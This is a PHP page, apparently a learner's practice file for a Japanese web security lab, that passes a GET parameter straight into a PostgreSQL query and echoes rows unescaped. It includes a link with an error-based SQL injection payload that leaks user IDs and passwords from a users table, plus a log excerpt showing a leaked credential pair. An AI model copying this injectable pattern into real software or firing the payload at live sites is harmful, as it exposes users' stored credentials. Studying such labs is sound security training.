<?php
  ini_set( 'display_errors', 1 );
  session_start();
  header('Content-Type: text/html; charset=UTF-8');
  $author = $_GET['author'];
  $con = pg_connect("host=localhost dbname=wasbook user=postgres password=wasbook");
  $sql = "SELECT * FROM books WHERE author ='$author' ORDER BY id";
  $rs = pg_query($con, $sql);
?>
<html>
<body>
<a href="http://example.jp/44/44-001.php?author=Shakespeare">http://example.jp/44/44-001.php?author=Shakespeare</a><br/>
<a href="http://example.jp/44/44-001.php?author=%27+and+cast%28%28select+id||%27:%27||pwd+from+users+offset+0+limit+1%29+as+integer%29%3E1--">http://example.jp/44/44-001.php?author=%27+and+cast%28%28select+id||%27:%27||pwd+from+users+offset+0+limit+1%29+as+integer%29%3E1--</a>
<p>エラーログは出てるがPHP側に出ない？？？</p>
<p>author: <?php $_GET['author']; ?></p>
<pre>
2014-10-07 02:32:11 UTC ERROR:  invalid input syntax for integer: "yamada:pass1"
2014-10-07 02:32:11 UTC STATEMENT:  SELECT * FROM books WHERE author ='' and cast((select id||':'||pwd from users offset 0 limit 1) as integer)>1--' ORDER BY id
</pre>
<table border=1>
<tr>
<th>蔵書ID</th>
<th>タイトル</th>
<th>著者名</th>
<th>出版社</th>
<th>出版年月</th>
<th>価格</th>
</tr>
<?php
  $maxrows = pg_num_rows($rs);
  for ($i = 0; $i < $maxrows; $i++) {
    $row = pg_fetch_row($rs, $i);
    echo "<tr>\n";
    for ($j = 0; $j < 6; $j++) {
      echo "<td>" . $row[$j] . "</td>\n";
    }
    echo "</tr>\n";
  }
  pg_close($con);
?>
</table>
</body>
</html>
